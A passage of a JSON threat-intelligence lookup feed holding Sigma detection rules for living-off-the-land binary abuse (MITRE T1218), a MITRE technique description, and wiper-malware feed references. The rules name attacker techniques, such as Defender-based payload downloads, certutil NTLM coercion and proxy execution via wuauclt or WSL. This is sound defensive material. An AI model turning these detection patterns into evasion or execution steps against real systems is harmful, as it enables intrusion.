                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/10/23\ndescription: Detects when a user installs certificates by using CertOC.exe to loads\n  the target DLL file.\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - ' -LoadDLL '\n    - ' /LoadDLL '\n  selection_img:\n  - Image|endswith: \\certoc.exe\n  - OriginalFileName: CertOC.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 242301bc-f92f-4476-8718-78004a6efd9f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/24\nreferences:\n- https://twitter.com/sblmsrsn/status/1445758411803480072?s=20\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-fe98e74189873d6df72a15df2eaa0315c59ba9cdaca93ecd68afc4ea09194ef2\n- https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Load DLL via CertOC.exe\n",
                            "sigma:id": "242301bc-f92f-4476-8718-78004a6efd9f",
                            "title": "Suspicious Load DLL via CertOC.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7efd2c8d-8b18-45b7-947d-adfe9ed04f61",
                        "lookup_data": {
                            "description": "Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th postiional argument",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems), memory-shards\ndate: 2022/12/24\ndescription: Detects execution of the AgentExecutor.exe binary. Which can be abused\n  as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any\n  binary named \"powershell.exe\" located in the path provided by 6th postiional argument\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - ' -powershell'\n    - ' -remediationScript'\n  selection_img:\n  - Image: \\AgentExecutor.exe\n  - OriginalFileName: AgentExecutor.exe\nfalsepositives:\n- Legitimate use via Intune management. You exclude script paths and names to reduce\n  FP rate\nid: 7efd2c8d-8b18-45b7-947d-adfe9ed04f61\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/lefterispan/status/1286259016436514816\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/\n- https://docs.microsoft.com/en-us/mem/intune/apps/intune-management-extension\n- https://twitter.com/jseerden/status/1247985304667066373/photo/1\nrelated:\n- id: c0b40568-b1e9-4b03-8d6c-b096da6da9ab\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: AgentExecutor PowerShell Execution\n",
                            "sigma:id": "7efd2c8d-8b18-45b7-947d-adfe9ed04f61",
                            "title": "AgentExecutor PowerShell Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9cfc00b6-bfb7-49ce-9781-ef78503154bb",
                        "lookup_data": {
                            "description": "Detects use of Wlrmdr.exe in which the -u parameter is passed to ShellExecute",
                            "raw": "author: frack113, manasmbellani\ndate: 2022/02/16\ndescription: Detects use of Wlrmdr.exe in which the -u parameter is passed to ShellExecute\ndetection:\n  condition: selection_parent or (all of selection_child_* and not 1 of filter*)\n  filter:\n    ParentImage: C:\\Windows\\System32\\winlogon.exe\n  filter_null:\n    ParentImage: '-'\n  selection_child_cli:\n    CommandLine|contains|all:\n    - '-s '\n    - '-f '\n    - '-t '\n    - '-m '\n    - '-a '\n    - '-u '\n  selection_child_img:\n  - Image|endswith: \\wlrmdr.exe\n  - OriginalFileName: WLRMNDR.EXE\n  selection_parent:\n    ParentImage|endswith: \\wlrmdr.exe\nfalsepositives:\n- Unknown\nid: 9cfc00b6-bfb7-49ce-9781-ef78503154bb\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/06\nreferences:\n- https://twitter.com/0gtweet/status/1493963591745220608?s=20&t=xUg9DsZhJy1q9bPTUWgeIQ\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Wlrmdr Lolbin Use as Launcher\n",
                            "sigma:id": "9cfc00b6-bfb7-49ce-9781-ef78503154bb",
                            "title": "Wlrmdr Lolbin Use as Launcher",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "46123129-1024-423e-9fae-43af4a0fa9a5",
                        "lookup_data": {
                            "description": "Detect the use of Windows Defender to download payloads",
                            "raw": "author: Matthew Matchen\ndate: 2020/09/04\ndescription: Detect the use of Windows Defender to download payloads\ndetection:\n  condition: all of selection*\n  selection1:\n  - CommandLine|contains: MpCmdRun.exe\n  - Description: Microsoft Malware Protection Command Line Utility\n  selection2:\n    CommandLine|contains|all:\n    - DownloadFile\n    - url\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: 46123129-1024-423e-9fae-43af4a0fa9a5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866\n- https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.command_and_control\n- attack.t1105\ntitle: Windows Defender Download Activity\n",
                            "sigma:id": "46123129-1024-423e-9fae-43af4a0fa9a5",
                            "title": "Windows Defender Download Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5594e67a-7f92-4a04-b65d-1a42fd824a60",
                        "lookup_data": {
                            "description": "Detects installation of a remote msi file from web.",
                            "raw": "author: Stamatis Chatzimangou\ndate: 2022/10/23\ndescription: Detects installation of a remote msi file from web.\ndetection:\n  condition: selection\n  selection:\n    Data|contains: ://\n    EventID:\n    - 1040\n    - 1042\n    Provider_Name: MsiInstaller\nfalsepositives:\n- Unknown\nid: 5594e67a-7f92-4a04-b65d-1a42fd824a60\nlevel: medium\nlogsource:\n  product: windows\n  service: application\nmodified: 2022/10/23\nreferences:\n- https://twitter.com/_st0pp3r_/status/1583922009842802689\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1218\n- attack.t1218.007\ntitle: MSI Installation From Web\n",
                            "sigma:id": "5594e67a-7f92-4a04-b65d-1a42fd824a60",
                            "title": "MSI Installation From Web",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6",
                        "lookup_data": {
                            "description": "Detects the execution utitilies often found in Visual Studio tools that hardcode the call to the binary \"link.exe\". They can be abused to sideload any binary with the same name",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/22\ndescription: Detects the execution utitilies often found in Visual Studio tools that\n  hardcode the call to the binary \"link.exe\". They can be abused to sideload any binary\n  with the same name\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_visual_studio:\n    ParentImage|contains: \\VC\\Tools\\MSVC\\\n    ParentImage|startswith:\n    - C:\\Program Files\\Microsoft Visual Studio\\\n    - C:\\Program Files (x86)\\Microsoft Visual Studio\\\n  selection:\n    CommandLine|contains: LINK /\n    Image|endswith: \\link.exe\nfalsepositives:\n- Unknown\nid: 6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/0gtweet/status/1560732860935729152\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Sideloading Link.EXE\n",
                            "sigma:id": "6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6",
                            "title": "Sideloading Link.EXE",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b9b6dcfa-0b11-40dc-9bf4-9a36a2c1a046",
                        "lookup_data": {
                            "description": "HermeticWiper | New Destructive Malware Used In Cyber Attacks on Ukraine",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/b9b6dcfa-0b11-40dc-9bf4-9a36a2c1a046.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1664880605",
                            "uuid": "b9b6dcfa-0b11-40dc-9bf4-9a36a2c1a046",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "457c7820-d331-465a-915e-42f85500ccc4",
                        "lookup_data": {
                            "mitre-attack-id": "T1218",
                            "mitre-cti:description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",
                            "mitre-cti:name": "System Binary Proxy Execution",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows', 'Linux', 'macOS'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Nishan Maharjan, @loki248', 'Hans Christoffer Gaardløs', 'Praetorian', 'Wes Hurd'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'created': '2018-04-18T17:59:24.739Z', 'x_mitre_version': '3.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1218', 'url': 'https://attack.mitre.org/techniques/T1218'}, {'source_name': 'GTFO split', 'url': 'https://gtfobins.github.io/gtfobins/split/', 'description': 'GTFOBins. (2020, November 13). split. Retrieved April 18, 2022.'}, {'source_name': 'LOLBAS Project', 'url': 'https://github.com/LOLBAS-Project/LOLBAS#criteria', 'description': 'Oddvar Moe et al. (2022, February).  Living Off The Land Binaries, Scripts and Libraries. Retrieved March 7, 2022.'}, {'source_name': 'split man page', 'url': 'https://man7.org/linux/man-pages/man1/split.1.html', 'description': 'Torbjorn Granlund, Richard M. Stallman. (2020, March null). split(1) — Linux manual page. Retrieved March 25, 2022.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\\n\\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)', 'modified': '2022-04-18T14:52:08.678Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'System Binary Proxy Execution', 'x_mitre_detection': 'Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_is_subtechnique': False, 'x_mitre_data_sources': ['Windows Registry: Windows Registry Key Modification', 'Command: Command Execution', 'Module: Module Load', 'Process: Process Creation', 'File: File Creation', 'Network Traffic: Network Connection Creation', 'Process: OS API Execution'], 'x_mitre_defense_bypassed': ['Anti-virus', 'Application control', 'Digital Certificate Validation'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b8b1b304-a60f-4999-9a6e-c547bde03ffd",
                        "lookup_data": {
                            "description": "Detects the execution of DeviceCredentialDeployment to hide a process from view",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/19\ndescription: Detects the execution of DeviceCredentialDeployment to hide a process\n  from view\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\DeviceCredentialDeployment.exe\nfalsepositives:\n- Unlikely\nid: b8b1b304-a60f-4999-9a6e-c547bde03ffd\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/pull/147\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: DeviceCredentialDeployment Execution\n",
                            "sigma:id": "b8b1b304-a60f-4999-9a6e-c547bde03ffd",
                            "title": "DeviceCredentialDeployment Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "dec44ca7-61ad-493c-bfd7-8819c5faa09b",
                        "lookup_data": {
                            "description": "Detects Possible usage of Windows Subsystem for Linux (WSL) binary as a LOLBIN to execute arbitrary linux and windows commands",
                            "raw": "author: oscd.community, Zach Stanford @svch0st, Nasreddine Bencherchali\ndate: 2020/10/05\ndescription: Detects Possible usage of Windows Subsystem for Linux (WSL) binary as\n  a LOLBIN to execute arbitrary linux and windows commands\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_kill:\n    CommandLine|contains|all:\n    - ' -d '\n    - ' -e kill '\n    ParentImage|endswith: \\cmd.exe\n  selection_cli:\n    CommandLine|contains:\n    - ' -e '\n    - ' --exec'\n    - ' --system'\n    - ' --shell-type '\n    - ' /mnt/c'\n    - ' --user root'\n    - ' -u root'\n  selection_img:\n  - Image|endswith: \\wsl.exe\n  - OriginalFileName: wsl.exe\nfalsepositives:\n- Automation and orchestration scripts may use this method execute scripts etc\n- Legitimate use by Windows to kill processes opened via WSL (example VsCode WSL server)\nid: dec44ca7-61ad-493c-bfd7-8819c5faa09b\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/\n- https://twitter.com/nas_bench/status/1535431474429808642\nrelated:\n- id: 2267fe65-0681-42ad-9a6d-46553d3f3480\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: Arbitrary Command Execution Using WSL\n",
                            "sigma:id": "dec44ca7-61ad-493c-bfd7-8819c5faa09b",
                            "title": "Arbitrary Command Execution Using WSL",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fc014922-5def-4da9-a0fc-28c973f41bfb",
                        "lookup_data": {
                            "description": "This rule detects that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry.",
                            "raw": "author: oscd.community, Natalia Shornikova\ndate: 2020/10/13\ndescription: This rule detects that the path to the DLL written in the registry is\n  different from the default one. Launched WAB.exe tries to load the DLL from Registry.\ndetection:\n  condition: selection and not filter\n  filter:\n    Details: '%CommonProgramFiles%\\System\\wab32.dll'\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: \\Software\\Microsoft\\WAB\\DLLPath\nfalsepositives:\n- Unknown\nid: fc014922-5def-4da9-a0fc-28c973f41bfb\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OSBinaries/Wab.yml\n- https://twitter.com/Hexacorn/status/991447379864932352\n- http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Execution DLL of Choice Using WAB.EXE\n",
                            "sigma:id": "fc014922-5def-4da9-a0fc-28c973f41bfb",
                            "title": "Execution DLL of Choice Using WAB.EXE",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "727454c0-d851-48b0-8b89-385611ab0704",
                        "lookup_data": {
                            "description": "Detect usage of the \"unregmp2.exe\" binary as a proxy to launch a custom version of \"wmpnscfg.exe\"",
                            "raw": "author: frack113\ndate: 2022/12/29\ndescription: Detect usage of the \"unregmp2.exe\" binary as a proxy to launch a custom\n  version of \"wmpnscfg.exe\"\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n    CommandLine|contains: ' /HideWMP'\n  selection_img:\n  - Image|endswith: \\unregmp2.exe\n  - OriginalFileName: unregmp2.exe\nfalsepositives:\n- Unknown\nid: 727454c0-d851-48b0-8b89-385611ab0704\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Lolbin Unregmp2.exe Use As Proxy\n",
                            "sigma:id": "727454c0-d851-48b0-8b89-385611ab0704",
                            "title": "Lolbin Unregmp2.exe Use As Proxy",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "15c7904e-6ad1-4a45-9b46-5fb25df37fd2",
                        "lookup_data": {
                            "description": "There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\nThis option may be used adversaries to execute malicious code by signed verified binary.\nThe debugger is installed alongside with Microsoft Visual Studio package.\n",
                            "raw": "author: \"Agro (@agro_sev), Ensar \\u015Eamil (@sblmsrsn), oscd.community\"\ndate: 2020/10/14\ndescription: 'There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\"\n  to launch specified executable and attach a debugger.\n\n  This option may be used adversaries to execute malicious code by signed verified\n  binary.\n\n  The debugger is installed alongside with Microsoft Visual Studio package.\n\n  '\ndetection:\n  condition: selection and not (reduction1 or reduction2)\n  reduction1:\n    Image|endswith: \\vsimmersiveactivatehelper*.exe\n  reduction2:\n    Image|endswith: \\devenv.exe\n  selection:\n    ParentImage|endswith: \\vsjitdebugger.exe\nfalsepositives:\n- The process spawned by vsjitdebugger.exe is uncommon.\nid: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/pabraeken/status/990758590020452353\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/\n- https://docs.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019\nstatus: test\ntags:\n- attack.t1218\n- attack.defense_evasion\ntitle: Malicious PE Execution by Microsoft Visual Studio Debugger\n",
                            "sigma:id": "15c7904e-6ad1-4a45-9b46-5fb25df37fd2",
                            "title": "Malicious PE Execution by Microsoft Visual Studio Debugger",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6c6d9280-e6d0-4b9d-80ac-254701b64916",
                        "lookup_data": {
                            "description": "Detects possible NTLM coercion via certutil using the 'syncwithWU' flag",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/01\ndescription: Detects possible NTLM coercion via certutil using the 'syncwithWU' flag\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains|all:\n    - ' -syncwithWU '\n    - ' \\\\\\\\'\n  selection_img:\n  - Image|endswith: \\certutil.exe\n  - OriginalFileName: CertUtil.exe\nfalsepositives:\n- Unknown\nid: 6c6d9280-e6d0-4b9d-80ac-254701b64916\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/issues/243\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: NTLM Coercion Via Certutil.exe\n",
                            "sigma:id": "6c6d9280-e6d0-4b9d-80ac-254701b64916",
                            "title": "NTLM Coercion Via Certutil.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9eb271b9-24ae-4cd4-9465-19cfc1047f3e",
                        "lookup_data": {
                            "description": "Attackers can use explorer.exe for evading defense mechanisms",
                            "raw": "author: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative\ndate: 2020/10/05\ndescription: Attackers can use explorer.exe for evading defense mechanisms\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: explorer.exe\n    Image|endswith: \\explorer.exe\n    ParentImage|endswith: \\cmd.exe\nfalsepositives:\n- Legitimate explorer.exe run from cmd.exe\nid: 9eb271b9-24ae-4cd4-9465-19cfc1047f3e\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/CyberRaiju/status/1273597319322058752\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Proxy Execution Via Explorer.exe\n",
                            "sigma:id": "9eb271b9-24ae-4cd4-9465-19cfc1047f3e",
                            "title": "Proxy Execution Via Explorer.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9f107a84-532c-41af-b005-8d12a607639f",
                        "lookup_data": {
                            "description": "Adversaries can use the inbuilt expand utility to decompress cab files as seen in recent Iranian MeteorExpress attack",
                            "raw": "author: Bhabesh Raj\ndate: 2021/07/30\ndescription: Adversaries can use the inbuilt expand utility to decompress cab files\n  as seen in recent Iranian MeteorExpress attack\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_dell:\n    CommandLine|contains: C:\\ProgramData\\Dell\\UpdateService\\Temp\\\n    ParentImage: C:\\Program Files (x86)\\Dell\\UpdateService\\ServiceShell.exe\n  selection:\n    CommandLine|contains:\n    - .cab\n    - '/F:'\n    - '-F:'\n    - C:\\ProgramData\\\n    - C:\\Public\\\n    - \\AppData\\Local\\Temp\\\n    - \\AppData\\Roaming\\Temp\\\n    Image|endswith: \\expand.exe\nfalsepositives:\n- System administrator Usage\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 9f107a84-532c-41af-b005-8d12a607639f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://labs.sentinelone.com/meteorexpress-mysterious-wiper-paralyzes-iranian-trains-with-epic-troll\n- https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/\nstatus: test\ntags:\n- attack.execution\n- attack.t1218\ntitle: Cabinet File Expansion\n",
                            "sigma:id": "9f107a84-532c-41af-b005-8d12a607639f",
                            "title": "Cabinet File Expansion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c649a6c7-cd8c-4a78-9c04-000fc76df954",
                        "lookup_data": {
                            "description": "Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code and making a network connections.\nOne could easily make the DLL spawn a new process and inject to it to proxy the network connection and bypass this rule.\n",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/10/12\ndescription: 'Detects the use of the Windows Update Client binary (wuauclt.exe) to\n  proxy execute code and making a network connections.\n\n  One could easily make the DLL spawn a new process and inject to it to proxy the\n  network connection and bypass this rule.\n\n  '\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_cmdline:\n    CommandLine|contains: '\\UpdateDeploy.dll /ClassId '\n  filter_msrange:\n    DestinationIp|startswith:\n    - 20.184.\n    - 20.185.\n    - 20.186.\n    - 20.187.\n    - 20.188.\n    - 20.189.\n    - 20.190.\n    - 20.191.\n    - 23.79.\n    - 51.10.\n    - 51.103.\n    - 51.104.\n    - 51.105.\n    - 52.239.\n  selection:\n    Image|contains: wuauclt\nfalsepositives:\n- Legitimate use of wuauclt.exe over the network.\nid: c649a6c7-cd8c-4a78-9c04-000fc76df954\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2023/01/20\nreferences:\n- https://dtm.uk/wuauclt/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Wuauclt Network Connection\n",
                            "sigma:id": "c649a6c7-cd8c-4a78-9c04-000fc76df954",
                            "title": "Wuauclt Network Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b97cd4b1-30b8-4a9d-bd72-6293928d52bc",
                        "lookup_data": {
                            "description": "Detect indirect command execution via Program Compatibility Assistant pcwrun.exe",
                            "raw": "author: A. Sungurov , oscd.community\ndate: 2020/10/12\ndescription: Detect indirect command execution via Program Compatibility Assistant\n  pcwrun.exe\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\pcwrun.exe\nfalsepositives:\n- Need to use extra processing with 'unique_count' / 'filter' to focus on outliers\n  as opposed to commonly seen artifacts\n- Legit usage of scripts\nfields:\n- ComputerName\n- User\n- ParentCommandLine\n- CommandLine\nid: b97cd4b1-30b8-4a9d-bd72-6293928d52bc\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/pabraeken/status/991335019833708544\n- https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.execution\ntitle: Indirect Command Execution By Program Compatibility Wizard\n",
                            "sigma:id": "b97cd4b1-30b8-4a9d-bd72-6293928d52bc",
                            "title": "Indirect Command Execution By Program Compatibility Wizard",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b2309017-4235-44fe-b5af-b15363011957",
                        "lookup_data": {
                            "description": "Detect usage of the \"defaultpack.exe\" binary as a proxy to launch other programs",
                            "raw": "author: frack113\ndate: 2022/12/31\ndescription: Detect usage of the \"defaultpack.exe\" binary as a proxy to launch other\n  programs\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\defaultpack.exe\nfalsepositives:\n- Unknown\nid: b2309017-4235-44fe-b5af-b15363011957\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/DefaultPack/\n- https://www.echotrail.io/insights/search/defaultpack.exe\nstatus: experimental\ntags:\n- attack.t1218\n- attack.defense_evasion\n- attack.execution\ntitle: Lolbin Defaultpack.exe Use As Proxy\n",
                            "sigma:id": "b2309017-4235-44fe-b5af-b15363011957",
                            "title": "Lolbin Defaultpack.exe Use As Proxy",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "af77cf95-c469-471c-b6a0-946c685c4798",
                        "lookup_data": {
                            "description": "Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), Florian Roth\n  (Nextron Systems), Sreeman, FPT.EagleEye Team\ndate: 2020/10/12\ndescription: Detects the use of the Windows Update Client binary (wuauclt.exe) to\n  proxy execute code.\ndetection:\n  condition: selection_one and selection_two and not filter\n  filter:\n    CommandLine|contains:\n    - ' /UpdateDeploymentProvider UpdateDeploymentProvider.dll '\n    - ' wuaueng.dll '\n  selection_one:\n  - Image|contains: wuauclt\n  - OriginalFileName: wuauclt.exe\n  selection_two:\n    CommandLine|contains|all:\n    - UpdateDeploymentProvider\n    - .dll\n    - RunHandlerComServer\nfalsepositives:\n- Unknown\nid: af77cf95-c469-471c-b6a0-946c685c4798\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://dtm.uk/wuauclt/\n- https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\nrelated:\n- id: ba1bb0cb-73da-42de-ad3a-de10c643a5d0\n  type: obsoletes\n- id: d7825193-b70a-48a4-b992-8b5b3015cc11\n  type: obsoletes\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.execution\ntitle: Proxy Execution via Wuauclt\n",
                            "sigma:id": "af77cf95-c469-471c-b6a0-946c685c4798",
                            "title": "Proxy Execution via Wuauclt",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fbd7c32d-db2a-4418-b92c-566eb8911133",
                        "lookup_data": {
                            "description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.",
                            "raw": "author: frack113\ndate: 2021/07/12\ndescription: Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: '\"n; '\n  selection_img:\n  - Image|endswith: \\SyncAppvPublishingServer.exe\n  - OriginalFileName: syncappvpublishingserver.exe\nfalsepositives:\n- App-V clients\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: fbd7c32d-db2a-4418-b92c-566eb8911133\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/04\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nrelated:\n- id: fde7929d-8beb-4a4c-b922-be9974671667\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: SyncAppvPublishingServer Execute Arbitrary PowerShell Code\n",
                            "sigma:id": "fbd7c32d-db2a-4418-b92c-566eb8911133",
                            "title": "SyncAppvPublishingServer Execute Arbitrary PowerShell Code",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "56cb2bd3-5525-46bd-a454-ea895a5b4d0d",
                        "lookup_data": {
                            "description": "New data wiper malware used in Ukraine",
                            "link": "http://www.botvrij.eu/data/feed-osint/56cb2bd3-5525-46bd-a454-ea895a5b4d0d.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
